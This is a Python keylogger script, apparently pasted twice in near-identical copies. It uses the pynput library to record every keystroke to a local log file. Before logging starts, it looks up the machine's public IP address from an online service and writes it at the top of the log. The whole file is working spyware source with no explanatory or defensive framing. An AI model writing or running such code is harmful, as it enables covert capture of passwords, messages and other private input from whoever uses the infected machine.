import pynput
import sys
import requests

from pynput.keyboard import Key, Listener

def press(key):
    print("{} pressed".format(key))
    write_to_file(key)

def release(key):
    if key is Key.esc:
        return False

def write_to_file(key):
    with open('log.txt', 'a') as f:
        k = str(key).replace("'", "")  # remove ' from output file
        if k.find("space") > 0:
            f.write(' ')
        elif k.find("enter") > 0:
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)

# Get the internet IP address
response = requests.get("https://api.ipify.org?format=json")
ip_address = response.json()["ip"]
print("Internet IP Address:", ip_address)

# Write the internet IP address to the log file
with open('log.txt', 'w') as f:
    f.write("Internet IP Address: {}\n".format(ip_address))

with Listener(on_press=press, on_release=release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        sys.exit(0)
import pynput
import sys
import requests

from pynput.keyboard import Key, Listener

def press(key):
    print("{} pressed".format(key))
    write_to_file(key)

def release(key):
    if key is Key.esc:
        return False

def write_to_file(key):
    with open('log.txt', 'a') as f:
        k = str(key).replace("'", "")  # remove ' from output file
        if k.find("space") > 0:
            f.write(' ')
        elif k.find("enter") > 0:
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)

response = requests.get("https://api.ipify.org?format=json") # get IP address
ip_address = response.json()["ip"]
print("Internet IP Address:", ip_address)

with open('log.txt', 'w') as f:
    f.write("Internet IP Address: {}\n".format(ip_address))

with Listener(on_press=press, on_release=release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        sys.exit(0)
